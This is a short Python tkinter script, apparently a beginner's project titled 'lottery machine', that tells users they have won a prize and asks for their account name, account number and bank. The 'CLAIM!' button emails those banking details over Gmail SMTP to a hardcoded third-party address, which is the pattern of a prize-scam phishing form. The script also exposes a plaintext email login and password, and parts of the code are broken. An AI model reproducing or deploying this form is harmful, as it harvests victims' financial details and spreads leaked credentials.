# Amanda Makara

from tkinter import *
from tkinter import messagebox
from tkinter.ttk import Combobox
import smtplib

window = Tk()
window.title("lottery machine Amanda Makara")
window.geometry("597x500")
window.config(bg="yellow")

# definitions


def close():
    mgbox = messagebox.askquestion("exit application", "are you sure you want to exit?", icon="warning")

    if mgbox == "yes":
        window.destroy()
    else:
        messagebox.showinfo("return", "you'll return to your application" )

def claim():

    sender = "amandamakara7@gmail.com"
    user = "demijefferies@gmail.com"
    password = "@manda20W"
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.login(sender,password)
    message = "congradulations ", "you won the prize " + "\n" "here are you banking details" + acountnum.get() + "\n" + acount.get() + "\n" + banktype.get()
    s.sendmail(sender, user, message)
    s.quit()





# entries and windows
account = Label(window, text="Enter your account name")
account.place(x=100, y=180)

acount = Entry(window,)
acount.place(x=275, y=180)

acountnum = Label(window, text="Enter your account number")
acountnum.place(x=100, y=230)

acountnum = Entry(window,)
acountnum.place(x=280, y=230)

banktype = Label(window, text="Enter your type of bank")
banktype.place(x=100, y=270)

banktype = Entry(window)
banktype.place(x=280,y=270)
banktype  =Label (window, text="enter your branch")
banktype.place(x=100, y=330)
banktype = Combobox(window, value=['Capitec', "Standard bank", "FNB", "Nedbank", "ABSA"])
banktype.place(x=280, y=330)


# buttons

exit_btn = Button(window, text='Exit', bg='blue', command=close, pady="10", width=10)
exit_btn.place(x=340, y=400)

cal_btn = Button(window, text='CLAIM!', bg='red', pady="10", width=10, command=claim)
cal_btn.place(x=220, y=400)


window.mainloop()